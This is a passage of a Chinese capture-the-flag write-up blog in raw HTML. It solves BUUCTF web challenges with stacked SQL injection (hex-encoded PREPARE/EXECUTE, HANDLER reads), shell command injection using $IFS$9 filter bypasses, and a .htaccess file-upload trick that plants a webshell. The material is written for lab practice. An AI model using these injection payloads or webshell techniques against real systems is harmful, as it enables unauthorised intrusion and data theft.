class="line"><span class="number">6</span>：删除表中主键</span><br><span class="line"></span><br><span class="line"><span class="keyword">Alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">primary key</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>：添加主键</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 约束名 <span class="keyword">PRIMARY KEY</span> (添加列)</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>：添加索引</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">index</span> 索引名 (列名);</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>：修改列的属性</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 MODIFY <span class="keyword">COLUMN</span> 要修改属性的列名 新属性;</span><br><span class="line"></span><br><span class="line">一般情况下，不推荐在建表后对表进行大幅度修改，大幅度修改极有可能使表数据丢失。</span><br></pre></td></tr></table></figure>

<p>–</p>
<p>看了其他大佬的wp，这里补充两种方法</p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/103239145">原文链接</a></p>
<h4 id="解题思路2：预处理绕过select限制"><a href="#解题思路2：预处理绕过select限制" class="headerlink" title="解题思路2：预处理绕过select限制"></a><strong>解题思路2：<a href="https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">预处理</a>绕过select限制</strong></h4><p>因为select被过滤了，所以先将</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">` 1919810931114514 `</span></span><br></pre></td></tr></table></figure>

<p>进行16进制编码</p>
<p>再通过构造payload得</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure>

<p>进而得到flag</p>
<pre><code>prepare…from…是预处理语句，会进行编码转换。
execute用来执行由SQLPrepare创建的SQL语句。
SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
</code></pre>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20230503173612612.png"><img src="/wp-buuctf/image-20230503173612612.png" alt="image-20230503173612612"></a></p>
<h4 id="解题思路3：handler绕过"><a href="#解题思路3：handler绕过" class="headerlink" title="解题思路3：handler绕过"></a><strong>解题思路3：<a href="https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020">handler</a>绕过</strong></h4><p>payload：</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler <span class="string">`1919810931114514`</span> open as <span class="string">`a`</span>; handler <span class="string">`a`</span> read next;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20230503173624567.png"><img src="/wp-buuctf/image-20230503173624567.png" alt="image-20230503173624567"></a></p>
<h5 id="handler基本用法"><a href="#handler基本用法" class="headerlink" title="handler基本用法"></a>handler基本用法</h5><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; FIRST | <span class="keyword">NEXT</span> | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> &#123; FIRST | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> FIRST获取句柄的第一行，通过<span class="keyword">READ</span> <span class="keyword">NEXT</span>依次获取其它行。最后一行执行之后再执行<span class="keyword">NEXT</span>会返回一个空的结果。</span><br><span class="line">通过HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br><span class="line"></span><br><span class="line">通过索引去查看的话可以按照一定的顺序，获取表中的数据。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> index_name FIRST，获取句柄第一行（索引最小的一行），<span class="keyword">NEXT</span>获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</span><br><span class="line"></span><br><span class="line">通过索引列指定一个值，可以指定从哪一行开始。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> index_name = value，指定从哪一行开始，通过<span class="keyword">NEXT</span>继续浏览。</span><br></pre></td></tr></table></figure>



<p><u><code>句柄：【相当于一个指针，这里是指向数据库里的表】</code></u></p>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">3.1 创建测试表及测试数据</span><br><span class="line"></span><br><span class="line">create table handler<span class="emphasis">_table(  </span></span><br><span class="line"><span class="emphasis">    c1 int,   </span></span><br><span class="line"><span class="emphasis">    c2 varchar(10),   </span></span><br><span class="line"><span class="emphasis">    c3 int(10) </span></span><br><span class="line"><span class="emphasis">);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(2, &#x27;name2&#x27;, 002);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(5, &#x27;name5&#x27;, 005);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(1, &#x27;name1&#x27;, 001);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(4, &#x27;name4&#x27;, 004);  </span></span><br><span class="line"><span class="emphasis">insert into handler_</span>table values(3, <span class="emphasis">&#x27;name3&#x27;</span>, 003);</span><br><span class="line"></span><br><span class="line">3.2 不通过索引打开查看表</span><br><span class="line"></span><br><span class="line">打开句柄：【相当于一个指针】</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line">mysql&gt; handler handler_table read next;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table close;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">3.3 通过索引打开查看表（FIRST,NEXT,PREV,LAST）</span><br><span class="line">通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。</span><br><span class="line"></span><br><span class="line">创建索引：</span><br><span class="line"></span><br><span class="line">mysql&gt; create index handler_index on handler_table(c1);</span><br><span class="line"></span><br><span class="line">打开句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index prev;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.4 通过索引打开查看表（=,&lt;=,&gt;=,&lt;,&gt;）</span><br><span class="line">从index为2的地方开始</span><br><span class="line"></span><br><span class="line">打开句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index = (2);</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;     </span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.5 附加：语法实例参考</span><br><span class="line"></span><br><span class="line">handler handler<span class="emphasis">_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table open as p;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next where c1 &gt;2 limit 1,2;</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">create index handler_index on handler_table(c1);</span></span><br><span class="line"><span class="emphasis">handler handler_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index next limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index PREV limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index = (3);</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt;= (3) limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt;= (3) limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table close;</span></span><br><span class="line"><span class="emphasis">drop index handler_index on handler_</span>table;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里看懂以后，我自己又重新构造了一个</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler `<span class="number">19198109311145</span>14` open;handler `<span class="number">19198109311145</span>14` read first;</span><br></pre></td></tr></table></figure>

<p>效果一样，意思也差不多</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220731224702281.png"><img src="/wp-buuctf/image-20220731224702281.png" alt="image-20220731224702281"></a></p>
<h2 id="2-GXYCTF2019-Ping-Ping-Ping"><a href="#2-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="2.[GXYCTF2019]Ping Ping Ping"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字应该是道命令执行的题目</p>
<p>先传一个IP:123.123.123.123试试</p>
<p><code>?ip=123.123.123.123</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220706231831194.png"><img src="/wp-buuctf/image-20220706231831194.png" alt="image-20220706231831194"></a></p>
<p>看起来是Linux命令，先显示所有文件试试（;是顺序执行，从左往右，命令全部执行）</p>
<p><code>?ip=123.123.123.123;ls</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220706232001574.png"><img src="/wp-buuctf/image-20220706232001574.png" alt="image-20220706232001574"></a></p>
<p>看到flag文件，看看能不能直接读出</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220706232135596.png"><img src="/wp-buuctf/image-20220706232135596.png" alt="image-20220706232135596"></a></p>
<p>发现，空格被过滤了，我试试了很多绕过，比如%0a，%20，%09，&lt;&gt;，但是回显都是</p>
<p><code>?ip=123.123.123.123;cat%0aflag.php</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220706233818795.png"><img src="/wp-buuctf/image-20220706233818795.png" alt="image-20220706233818795"></a></p>
<p>意思是符号都过滤了</p>
<p>这里引入我一个新学的空格代替符$IFS$9，这是个shell中定义的环境变量，在此处可以绕过过滤</p>
<p>$IFS$9（$IFS是<strong>Unix</strong>系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</p>
<p>试试</p>
<p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220706234926216.png"><img src="/wp-buuctf/image-20220706234926216.png" alt="image-20220706234926216"></a></p>
<p>发现flag也被过滤了，那就只好先看看index.php文件，试试能不能看到其代码</p>
<p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到ip有很多正则匹配的字符，所以没有那么容易绕过</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">shell_exec </span>— 通过 <span class="keyword">shell </span>环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line"><span class="keyword">shell_exec(string </span>$cmd): string</span><br><span class="line">exec 是 <span class="keyword">Shell </span>内置命令，它有两种用法，一种是执行 <span class="keyword">Shell </span>命令，一种是操作文件描述符</span><br><span class="line">ping -c <span class="built_in">Count</span> 指定要被发送（或接收）的回送信号请求的数目，由 <span class="built_in">Count</span> 变量指出</span><br><span class="line">--(所以这里我们只能输入四个字符)--</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r函数用于打印变量，以更容易理解的形式展示</span><br><span class="line"></span><br><span class="line">例子</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span> (<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="keyword">array</span> (<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>)); </span><br><span class="line"><span class="title function_ invoke__">print_r</span> (<span class="variable">$a</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出结果</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [a] =&gt; apple</span><br><span class="line">    [b] =&gt; banana</span><br><span class="line">    [c] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; x</span><br><span class="line">            [<span class="number">1</span>] =&gt; y</span><br><span class="line">            [<span class="number">2</span>] =&gt; z</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>flag过滤语句的意思判断是否按顺序出现flag</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="built_in">if</span>(<span class="built_in">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))</span><br></pre></td></tr></table></figure>

<p>所以只要ip里的flag出现不按顺序就行，也就是flag另一种方式表示</p>
<p>我们看源码知道有两个变量，一个是$ip,$a</p>
<p>ip变量无法改变，变量a可以尝试赋值flag试试能不能绕过正则匹配，但是如果是a&#x3D;flag，就会顺序出现flag，匹配，所以试试a&#x3D;g，flag–&gt;fla$a</p>
<p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>查看源码</p>
<p>得到flag</p>
<h2 id="3-MRCTF2020-你传你🐎呢"><a href="#3-MRCTF2020-你传你🐎呢" class="headerlink" title="3.[MRCTF2020]你传你🐎呢"></a>3.[MRCTF2020]你传你🐎呢</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p> 看标题知道这是一个文件上传的题目，要求上传一个木马</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710111959632.png"><img src="/wp-buuctf/image-20220710111959632.png" alt="image-20220710111959632"></a></p>
<p>打开先看到一个尸体在在笑，我们先试试能不能直接上传php文件</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710112344441.png"><img src="/wp-buuctf/image-20220710112344441.png" alt="image-20220710112344441"></a></p>
<p>看来不行，那在试试能不能抓包修改前端文件后缀名，看看是不是前端验证，把php改成png，在抓包修改后缀为php</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710112344441.png"><img src="/wp-buuctf/image-20220710112344441.png" alt="image-20220710112344441"></a></p>
<p>还是一样，还有一个猜想就是MIME验证，对content-type进行了检查，可以试试使用bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>，修改上传的PHP的content-type为image&#x2F;png，但是还是一样的</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710112344441.png"><img src="/wp-buuctf/image-20220710112344441.png" alt="image-20220710112344441"></a></p>
<p>于是，可以用.htaccess实现图片马以php文件形式读取（如果不了解可以把.htaccess文件了解一下，把线下靶场upload-labs做一下）</p>
<p>但是上传时，又被过滤了</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710112344441.png"><img src="/wp-buuctf/image-20220710112344441.png" alt="image-20220710112344441"></a></p>
<p>尝试修改文件名为.htaccess.png，然后用bp抓包修改回.htaccess，上传成功</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710114410888.png"><img src="/wp-buuctf/image-20220710114410888.png" alt="image-20220710114410888"></a></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710114422488.png"><img src="/wp-buuctf/image-20220710114422488.png" alt="image-20220710114422488"></a></p>
<p>然后上传图片木马</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710114444539.png"><img src="/wp-buuctf/image-20220710114444539.png" alt="image-20220710114444539"></a></p>
<p>把路径复制一下</p>
<p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710114617412.png"><img src="/wp-buuctf/image-20220710114617412.png" alt="image-20220710114617412"></a></p>
<p>蚁剑连接成功</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220710114647722.png"><img src="/wp-buuctf/image-20220710114647722.png" alt="image-20220710114647722"></a></p>
<p>在根目录发现flag</p>
<p>得到flag</p>
<h2 id="4-RoarCTF-2019-Easy-Calc"><a href="#4-RoarCTF-2019-Easy-Calc" class="headerlink" title="4.[RoarCTF 2019]Easy Calc"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>还是得看大佬得wp才会</p>
<p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">原文链接</a></p>
<p>这是calc.php的内容，查看源码就可以看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span 